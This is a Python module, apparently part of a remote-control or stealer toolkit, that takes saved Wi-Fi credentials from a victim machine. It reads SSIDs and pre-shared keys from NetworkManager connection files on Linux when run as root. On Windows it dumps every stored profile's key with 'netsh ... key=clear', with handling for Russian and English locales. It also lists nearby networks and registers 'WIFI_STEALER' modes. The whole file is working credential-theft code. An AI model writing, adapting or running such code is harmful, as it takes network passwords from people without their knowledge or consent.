from modules import Command
import ctypes
import locale
import config
import constants
import os


def steal_wifi():
    if config.os_name == constants.Windows_OS:
        stolen_passwords = steal_wifi_windows()
    if config.os_name == constants.Linux_OS:
        stolen_passwords = steal_wifi_linux()
    if stolen_passwords == None:
        return "Seems like device haven't wlan."
    return stolen_passwords


def steal_wifi_linux():
    try:
        if not config.is_root:
            return (0, constants.TO_USE_MUST_BE_ROOT)

        networks_path = '/etc/NetworkManager/system-connections/'
        networks = os.listdir(networks_path)

        datas = dict()
        for network in networks:
            with open(networks_path + network, encoding='cp866') as file:
                data = file.readlines()

            ssid, psk = 'No', 'No'
            for line in data:
                if 'ssid=' in line:
                    ssid = line.replace('ssid=', '')
                if 'psk=' in line:
                    psk = line.replace('psk=', '')
            datas[ssid.strip()] = psk

        return (1, datas)

    except Exception as ex:
        return (0, 'Error: ' + str(ex))


def steal_wifi_windows():
    try:
        data = Command.run_command(
            f'netsh wlan show profiles').split('\n')
        print(data)

        windll = ctypes.windll.kernel32
        windll.GetUserDefaultUILanguage()

        languege = locale.windows_locale[windll.GetUserDefaultUILanguage()]
        england = {'User_profiles': 'All User Profile',
                   'key_content': 'Key Content'}
        rusland = {'User_profiles': "Все профили пользователей",
                   'key_content': "Содержимое ключа"}

        if languege == 'ru_RU':
            wifi_lang = rusland
        elif languege == 'en_US':
            wifi_lang = england
        else:
            wifi_lang = england

        wifis = [line.split(':')[1][1:]
                 for line in data if wifi_lang['User_profiles'] in line]

        datas = {}
        for wifi in wifis:
            results = Command.run_command(
                f'netsh wlan show profile "{wifi}" key=clear').split('\n')

            results = [line.split(':')[1][1:]
                       for line in results if wifi_lang['key_content'] in line]

            try:
                datas[wifi] = results[0]

            except:
                datas[wifi] = "Not found"

        if len(datas) == 0:
            return (0, "Not found")

        return (1, datas)

    except Exception as ex:
        return (0, 'Error: ' + str(ex))


def get_list_of_wifi():
    if config.os_name == constants.Windows_OS:
        list_of_wifi = get_list_of_wifi_windows()
    if config.os_name == constants.Linux_OS:
        list_of_wifi = get_list_of_wifi_linux()
    if list_of_wifi == None or list_of_wifi == '':
        return "Seems like device haven't wlan."
    return list_of_wifi


def get_list_of_wifi_linux():
    try:
        networks = Command.run_command(
            'nmcli device wifi list')

        decoded_networks = networks
    except Exception as ex:
        return ex

    return decoded_networks


def get_list_of_wifi_windows():
    try:
        networks = Command.run_command(
            'netsh wlan show networks')

    except Exception as ex:
        return ex

    return networks


modes = {constants.WIFI_STEALER_preview: constants.WIFI_STEALER,
         constants.WIFI_SHOWWIFI_preview: constants.WIFI_SHOWWIFI}
